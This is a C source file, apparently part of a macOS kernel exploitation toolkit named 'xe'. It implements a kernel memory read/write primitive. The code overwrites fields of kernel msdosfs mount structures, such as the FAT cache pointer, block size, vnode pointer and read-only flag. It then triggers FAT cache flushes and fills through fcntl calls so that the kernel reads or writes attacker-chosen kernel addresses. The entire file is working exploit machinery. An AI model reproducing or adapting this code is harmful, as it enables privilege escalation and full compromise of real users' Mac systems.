//
//  kmem_msdosfs.c
//  xe
//
//  Created by admin on 11/26/21.
//

#include <stdlib.h>
#include <unistd.h>

#include <IOKit/kext/KextManager.h>

#include "memory/kmem.h"
#include "memory/kmem_msdosfs.h"
#include "msdosfs.h"
#include "cmd/hdiutil.h"
#include "util/misc.h"
#include "util/assert.h"

#include "macos_params.h"

#define MAX_READ_SIZE 1024
#define MAX_WRITE_SIZE 1024


struct kmem_msdosfs {
    struct kmem_msdosfs_init_args args;
    
    int helper_cctl_fds[2];
    int worker_cctl_fd;
    
    struct xe_kmem_ops* ops;
};


void xe_kmem_msdosfs_update_helper_bridge(struct kmem_msdosfs* kmem, const char worker_data[TYPE_MSDOSFSMOUNT_SIZE]) {
    int fd = kmem->args.helper_bridge_fd;
    uint32_t* pm_fat_bytes = (uint32_t*)(kmem->args.helper_data + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_BYTES_OFFSET);
    xe_assert_cond(*pm_fat_bytes, >, 0);
    int copies = (*pm_fat_bytes + TYPE_MSDOSFSMOUNT_SIZE - 1) / TYPE_MSDOSFSMOUNT_SIZE;
    lseek(fd, 0, SEEK_SET);
    for (int i=0; i<copies; i++) {
        size_t written = write(fd, worker_data, TYPE_MSDOSFSMOUNT_SIZE);
        xe_assert_errno(written != TYPE_MSDOSFSMOUNT_SIZE);
        xe_assert_cond(written, ==, TYPE_MSDOSFSMOUNT_SIZE);
    }
}

void xe_kmem_msdosfs_init_worker_bridge(struct kmem_msdosfs* kmem) {
    uint32_t* pm_fat_bytes = (uint32_t*)(kmem->args.worker_data + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_BYTES_OFFSET);
    xe_assert_cond(*pm_fat_bytes, >, 0);
    int res = ftruncate(kmem->args.worker_bridge_fd, *pm_fat_bytes);
    xe_assert_cond(res, ==, 0);
}

void xe_kmem_msdosfs_init_helper_bridge(struct kmem_msdosfs* kmem) {
    uint32_t* pm_fat_bytes = (uint32_t*)(kmem->args.helper_data + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_BYTES_OFFSET);
    xe_assert_cond(*pm_fat_bytes, >, 0);
    int res = ftruncate(kmem->args.helper_bridge_fd, *pm_fat_bytes);
    xe_assert_cond(res, ==, 0);
    xe_kmem_msdosfs_update_helper_bridge(kmem, kmem->args.worker_data);
}

void xe_kmem_msdosfs_populate_helper_cache(struct kmem_msdosfs* kmem) {
    for (int i=0; i<XE_ARRAY_SIZE(kmem->helper_cctl_fds); i++) {
        struct log2phys args;
        bzero(&args, sizeof(args));
        args.l2p_contigbytes = 16384;
        args.l2p_devoffset = 16384;

        int res = fcntl(kmem->helper_cctl_fds[i], F_LOG2PHYS_EXT, &args);
        xe_assert_cond(res, ==, -1);
        xe_assert(errno == EIO || errno == E2BIG);
    }
}

void xe_kmem_msdosfs_update_worker_msdosfs(struct kmem_msdosfs* kmem, const char worker_data[TYPE_MSDOSFSMOUNT_SIZE]) {
    xe_kmem_msdosfs_update_helper_bridge(kmem, worker_data);
    xe_kmem_msdosfs_populate_helper_cache(kmem);
}

void xe_kmem_msdosfs_flush_worker_cache(struct kmem_msdosfs* kmem) {
    int error = fcntl(kmem->worker_cctl_fd, F_FLUSH_DATA);
    xe_assert_err(error);
}

void xe_kmem_msdosfs_prepare_worker_for_read(struct kmem_msdosfs* kmem, uintptr_t src, size_t src_size) {
    char worker_data[TYPE_MSDOSFSMOUNT_SIZE];
    memcpy(worker_data, kmem->args.worker_data, sizeof(worker_data));
    
    uint64_t* pm_fat_cache = (uint64_t*)(worker_data + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_CACHE_OFFSET);
    uint32_t* pm_fat_cache_offset = (uint32_t*)(worker_data + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_CACHE_OFFSET_OFFSET);
    uint* pm_flags = (uint*)(worker_data + TYPE_MSDOSFSMOUNT_MEM_PM_FLAGS_OFFSET);
    int* pm_fat_flags = (int*)(worker_data + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_FLAGS_OFFSET);
    uint32_t* pm_block_size = (uint32_t*)(worker_data + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_BLOCK_SIZE_OFFSET);
    uint64_t* pm_fat_active_vp = (uint64_t*)(worker_data + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_ACTIVE_VP_OFFSET);
    uint64_t* pm_sync_timer = (uint64_t*)(worker_data + TYPE_MSDOSFSMOUNT_MEM_PM_SYNC_TIMER);
    xe_assert(src_size <= *pm_block_size);
    
    *pm_fat_cache = src;
    *pm_fat_cache_offset = 0;
    *pm_block_size = (uint32_t)src_size;
    *pm_fat_active_vp = kmem->args.worker_bridge_vnode;
    *pm_flags &= (~MSDOSFSMNT_RONLY);
    *pm_fat_flags = 1; // mark fat cache dirty
    *pm_sync_timer = 0;
    
    xe_kmem_msdosfs_update_worker_msdosfs(kmem, worker_data);
}

void xe_kmem_msdosfs_populate_worker_cache(struct kmem_msdosfs* kmem) {
    int res = 0;
    int tries = 0;
    do {
        struct log2phys args;
        bzero(&args, sizeof(args));
        args.l2p_contigbytes = 16384 + random();
        args.l2p_devoffset = 16384 + random();
        res = fcntl(kmem->worker_cctl_fd, F_LOG2PHYS_EXT, &args);
        tries++;
    } while (res == 0 && tries < 5);
    xe_assert_cond(res, ==, -1);
    xe_assert(errno == EIO || errno == E2BIG);
}

void xe_kmem_msdosfs_prepare_worker_for_write(struct kmem_msdosfs* kmem, uintptr_t dst, size_t dst_size) {
    char worker_data[TYPE_MSDOSFSMOUNT_SIZE];
    memcpy(worker_data, kmem->args.worker_data, sizeof(worker_data));
    
    uint64_t* pm_fat_cache = (uint64_t*)(worker_data + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_CACHE_OFFSET);
    uint32_t* pm_fat_cache_offset = (uint32_t*)(worker_data + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_CACHE_OFFSET_OFFSET);
//    uint32_t* pm_fat_bytes = (uint32_t*)(worker_data + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_BYTES_OFFSET);
    uint* pm_fatmult = (uint*)(worker_data + TYPE_MSDOSFSMOUNT_MEM_PM_FATMULT);
    uint32_t* pm_block_size = (uint32_t*)(worker_data + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_BLOCK_SIZE_OFFSET);
    uint64_t* pm_fat_active_vp = (uint64_t*)(worker_data + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_ACTIVE_VP_OFFSET);
    xe_assert(dst_size <= *pm_block_size);
    
    *pm_fat_cache = dst;
    *pm_fat_cache_offset = INT32_MAX;
    *pm_block_size = (uint32_t)dst_size;
//    *pm_fat_bytes = (uint32_t)dst_size;
    *pm_fatmult = 0;
    *pm_fat_active_vp = kmem->args.worker_bridge_vnode;
    
    xe_kmem_msdosfs_update_worker_msdosfs(kmem, worker_data);
}

void xe_kmem_msdosfs_init_helper(struct kmem_msdosfs* kmem) {
    char path[PATH_MAX];
    snprintf(path, sizeof(path), "%s/data5", kmem->args.helper_mount_point);
    
    int fd1 = open(path, O_RDONLY);
    xe_assert_cond(fd1, >=, 0);
    
    snprintf(path, sizeof(path), "%s/data10", kmem->args.helper_mount_point);
    int fd2 = open(path, O_RDONLY);
    xe_assert_cond(fd2, >=, 0);
    
    kmem->helper_cctl_fds[0] = fd1;
    kmem->helper_cctl_fds[1] = fd2;

    int res = fcntl(kmem->args.helper_bridge_fd, F_NOCACHE);
    xe_assert_cond(res, ==, 0);
    xe_kmem_msdosfs_init_helper_bridge(kmem);
    
    char helper_data[TYPE_MSDOSFSMOUNT_SIZE];
    memcpy(helper_data, kmem->args.helper_data, sizeof(helper_data));
    
    uint64_t* pm_fat_cache = (uint64_t*)(helper_data + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_CACHE_OFFSET);
    uint32_t* pm_block_size = (uint32_t*)(helper_data + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_BLOCK_SIZE_OFFSET);
    uint64_t* pm_fat_active_vp = (uint64_t*)(helper_data + TYPE_MSDOSFSMOUNT_MEM_PM_FAT_ACTIVE_VP_OFFSET);
    
    *pm_fat_cache = kmem->args.worker_msdosfs;
    *pm_block_size = TYPE_MSDOSFSMOUNT_SIZE;
    *pm_fat_active_vp = kmem->args.helper_bridge_vnode;
    
    (kmem->args.helper_mutator)(kmem->args.helper_mutator_ctx, helper_data);
}

void xe_kmem_msdosfs_destroy_helper(struct kmem_msdosfs* kmem) {
    for (int i=0; i<XE_ARRAY_SIZE(kmem->helper_cctl_fds); i++) {
        close(kmem->helper_cctl_fds[i]);
    }
}

void xe_kmem_msdosfs_init_worker(struct kmem_msdosfs* kmem) {
    char path[PATH_MAX];
    snprintf(path, sizeof(path), "%s/data1", kmem->args.worker_mount_point);
    int fd = open(path, O_RDONLY);
    xe_assert_cond(fd, >=, 0);
    kmem->worker_cctl_fd = fd;
    
    int res = fcntl(kmem->args.worker_bridge_fd, F_NOCACHE);
    xe_assert_cond(res, ==, 0);
    xe_kmem_msdosfs_init_worker_bridge(kmem);
}

void xe_kmem_msdosfs_destroy_worker(struct kmem_msdosfs* kmem) {
    close(kmem->worker_cctl_fd);
}

void xe_kmem_msdosfs_read(void* ctx, void* dst, uintptr_t src, size_t size) {
    xe_assert_cond(size, <=, MAX_READ_SIZE);
    struct kmem_msdosfs* kmem_msdosfs = (struct kmem_msdosfs*)ctx;
    xe_kmem_msdosfs_prepare_worker_for_read(kmem_msdosfs, src, size);
    xe_kmem_msdosfs_flush_worker_cache(kmem_msdosfs);
    size_t off = lseek(kmem_msdosfs->args.worker_bridge_fd, 0, SEEK_SET);
    xe_assert_cond(off, ==, 0);
    size_t len = read(kmem_msdosfs->args.worker_bridge_fd, dst, size);
    xe_assert_cond(len, ==, size);
}

void xe_kmem_msdosfs_write(void* ctx, uintptr_t dst, void* src, size_t size) {
    xe_assert_cond(size, <=, MAX_WRITE_SIZE);
    struct kmem_msdosfs* kmem_msdosfs = (struct kmem_msdosfs*)ctx;
    size_t off = lseek(kmem_msdosfs->args.worker_bridge_fd, 0, SEEK_SET);
    xe_assert_cond(off, ==, 0);
    size_t len = write(kmem_msdosfs->args.worker_bridge_fd, src, size);
    xe_assert_cond(len, ==, size);
    xe_kmem_msdosfs_prepare_worker_for_write(kmem_msdosfs, dst, size);
    xe_kmem_msdosfs_populate_worker_cache(kmem_msdosfs);
}

static struct xe_kmem_ops xe_kmem_msdosfs_ops = {
    .read = xe_kmem_msdosfs_read,
    .write = xe_kmem_msdosfs_write,
    
    .max_read_size = MAX_READ_SIZE,
    .max_write_size = MAX_WRITE_SIZE,
};

struct xe_kmem_backend* xe_kmem_msdosfs_create(struct kmem_msdosfs_init_args* args) {
    struct kmem_msdosfs* kmem_msdosfs = (struct kmem_msdosfs*)malloc(sizeof(struct kmem_msdosfs));
    kmem_msdosfs->args = *args;
    
    xe_kmem_msdosfs_init_helper(kmem_msdosfs);
    xe_kmem_msdosfs_init_worker(kmem_msdosfs);
    
    struct xe_kmem_backend* backend = malloc(sizeof(struct xe_kmem_backend));
    backend->ops = &xe_kmem_msdosfs_ops;
    backend->ctx = kmem_msdosfs;
    
    return backend;
}

void xe_kmem_msdosfs_destroy(struct xe_kmem_backend* backend) {
    struct kmem_msdosfs* kmem = (struct kmem_msdosfs*)backend->ctx;
    xe_kmem_msdosfs_destroy_helper(kmem);
    xe_kmem_msdosfs_destroy_worker(kmem);
    free(kmem);
    free(backend);
}
